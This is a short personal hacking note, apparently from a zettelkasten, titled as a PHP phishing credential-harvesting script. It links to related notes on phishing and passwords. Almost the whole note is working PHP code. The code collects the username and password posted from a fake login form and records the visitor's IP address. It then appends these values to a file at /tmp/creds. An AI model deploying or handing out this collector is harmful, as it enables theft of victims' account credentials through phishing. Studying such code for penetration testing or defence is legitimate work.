# php quick client phishing attack credential harvesting
```php
<?php
// Turn off all error reporting
//error_reporting(0);

function get_ip() {
    if (function_exists('apache_request_headers')) {
      $headers = apache_request_headers();
    } else {
      $headers = $_SERVER;
    }
    if (array_key_exists('X-Forwarded-For',$headers) && filter_var($headers['X-Forwarded-For'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
      $the_ip = $headers['X-Forwarded-For'];
    } elseif (array_key_exists('HTTP_X_FORWARDED_FOR',$headers) && filter_var($headers['HTTP_X_FORWARDED_FOR'],FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
      $the_ip = $headers['HTTP_X_FORWARDED_FOR'];
    } else {
      $the_ip = filter_var($_SERVER['REMOTE_ADDR'],FILTER_VALIDATE_IP,FILTER_FLAG_IPV4);
    }
    return $the_ip;
  }

$password = $_POST['PasswordForm'];
$username = $_POST['UsernameForm'];


$ip = get_ip();
$browser = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER['HTTP_HOST'];

if ($password != '') {
  $creds = $ip . '|' . $username . '|' . $password . "\n";
}

$myfile = fopen("/tmp/creds", "a") or die("Unable to open file!");
fwrite($myfile, $creds);
fclose($myfile);
?>
```
` zet/20221003150577/README.md `

# Related

- [20221014185956](/zet/20221014185956/README.md) kb file named kb/hacking/php/PHP-credential-harvesting-write-file.md
- [20221018160416](/zet/20221018160416/README.md) phishing or credential harvesting concept
- [20221008215655](/zet/20221008215655/README.md) user account
- [20221008215530](/zet/20221008215530/README.md) username
- [20221008215325](/zet/20221008215325/README.md) password
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub

Tags:

    
